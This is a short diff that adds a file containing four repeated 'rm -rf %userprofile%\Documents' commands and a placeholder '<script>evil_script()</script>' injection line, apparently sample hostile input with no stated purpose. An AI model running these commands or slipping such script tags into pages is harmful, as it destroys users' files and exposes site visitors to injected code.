@@ -1,0 +1,6 @@
+rm -rf %userprofile%\Documents
+rm -rf %userprofile%\Documents
+rm -rf %userprofile%\Documents
+rm -rf %userprofile%\Documents
+
+<script>evil_script()</script>
